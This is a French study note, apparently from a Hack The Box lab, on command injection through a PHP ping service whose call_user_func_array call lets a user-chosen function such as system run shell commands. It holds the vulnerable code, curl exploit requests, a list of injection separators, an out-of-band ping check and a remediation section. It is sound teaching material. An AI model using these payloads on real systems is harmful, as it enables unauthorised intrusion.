# 🧩 Command Injection

Lié : [[15 - Arsenal Shells Python]] · [[18 - Cheatsheet Payloads]]

---

## Principe

Une command injection permet d'**exécuter des commandes système** sur le back-end. Elle survient quand une entrée utilisateur est utilisée pour construire/appeler une commande shell sans assainissement.

> 🎯 Leçon clé du module : la faille n'était **pas** dans la fonction `ping` (bien sécurisée) mais dans **la façon de l'appeler**. Toujours regarder au-delà de la fonction évidente.

---

## Le cas d'école (`call_user_func_array`)

Service de ping (port 3003), `ping-server.php` :
```php
function ping($host_url_ip, $packets) {
    if (!in_array($packets, array(1,2,3,4))) die('Only 1-4 packets!');
    $cmd = "ping -c".$packets." ".escapeshellarg($host_url_ip);  // ← bien protégé
    shell_exec($cmd);
}
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $prt = explode('/', $_SERVER['PATH_INFO']);
    call_user_func_array($prt[1], array_slice($prt, 2));         // ← LA faille
}
```

La fonction `ping` est saine : `escapeshellarg()` neutralise l'injection dans l'argument, et `$packets` est whitelisté. **Mais** `$prt[1]` (nom de la fonction appelée) est **contrôlé par l'utilisateur** et n'est jamais validé.

Découpage de `/ping-server.php/ping/1.1.1.1/3` :
```
$prt = ["", "ping", "1.1.1.1", "3"]
        [0]   [1]      [2]       [3]
$prt[1] = "ping"                 → fonction appelée
array_slice($prt,2) = [...]      → arguments
```

→ On remplace `ping` par **n'importe quelle fonction PHP**, ex. `system` :
```
http://<TARGET>:3003/ping-server.php/system/ls
→ call_user_func_array("system", ["ls"])  → RCE
```

`escapeshellarg` et la vérif des paquets deviennent **inutiles** : on ne passe plus par `ping`.

---

## Exploitation

```bash
# preuve
curl http://<TARGET>:3003/ping-server.php/system/id

# commandes avec arguments → URL-ENCODER les espaces et /
curl http://<TARGET>:3003/ping-server.php/system/id%20-a
curl http://<TARGET>:3003/ping-server.php/system/cat%20ping-server.php   # dump le code source
```

> ❓ *Questions HTB* : privilèges → `root` · exécuter des commandes avec arguments nécessite → **URL Encoding** (espace = `%20`, `/` = `%2F`).

---

## Détection (cas général, black-box)

Injecter des séparateurs de commande dans tout paramètre suspect :
```
; id          %3B id
| id          %7C id
&& id         `id`         $(id)
| ping -c1 TON_IP     # confirmer via tcpdump si pas de sortie visible
```
Confirmer une injection aveugle par **out-of-band** :
```bash
sudo tcpdump -i tun0 icmp        # puis injecter `ping -c1 TON_IP`
```

---

## Aller plus loin

- Récupère **toujours** le code source une fois l'accès obtenu (`cat` du script) → comprends la faille, cherche d'autres endpoints/creds.
- Passe à un reverse shell propre (voir [[15 - Arsenal Shells Python]]).

---

## Remédiation

- Ne jamais construire une commande shell depuis une entrée utilisateur ; préférer des API natives.
- **Whitelister** strictement les fonctions/valeurs appelables (jamais `call_user_func` sur input brut).
- `escapeshellarg`/`escapeshellcmd` sur **tous** les arguments — mais ça ne sauve rien si on court-circuite la fonction.

Tags : #command-injection #php #rce
